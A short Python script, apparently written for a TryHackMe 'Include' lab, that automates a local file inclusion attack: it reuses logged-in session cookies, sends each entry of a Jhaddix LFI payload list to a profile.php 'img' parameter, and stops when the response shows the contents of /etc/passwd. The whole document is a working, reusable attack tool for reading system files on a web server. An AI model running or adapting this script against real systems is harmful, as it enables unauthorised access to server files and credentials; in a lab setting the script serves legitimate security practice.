import requests

# Change these variables to suits your needs
# Set the target and port

target_ip = '10.10.47.92'
target_port = '50000'

# Set the cookies obtained after a successful login

connect_sid = 's%3AZzTlaCDVBh3QI1YW4p7R8v5ntvMN6ePt.IDg3kva70jRW%2BXcafps0%2BFSY0eXu4p1fN3rp5F6Dzgc'
phpsessid = 'prd7v21kdgn5uojfkn7tmbd1mu'

# Change the path and name of the list to be used

lfi_file = '/home/kali/Downloads/THM_Include/LFI-Jhaddix_short.txt'

# Do not touch these variables

target_uri = f'http://{target_ip}:{target_port}/profile.php?img='
cookies = {
    'connect.sid' : connect_sid,
    'PHPSESSID' : phpsessid

}

# Set-up the session using cookies 

session = requests.Session()
session.cookies.update(cookies)

# Read the file

try:
    with open(lfi_file, 'r') as file:
        for item in file:

            # Generate the request with a get method using list file payload

            request = session.get(f'{target_uri}{item.strip()}')

            # If the word 'root' (always found in the /etc/passwd file) is in the response, print the results and exit

            if 'root' in request.text:
                print(f'{target_uri}{item}')
                print(request.text)
                break

except FileNotFoundError:
    print(f"File not found: {lfi_file}")

print('End of file')
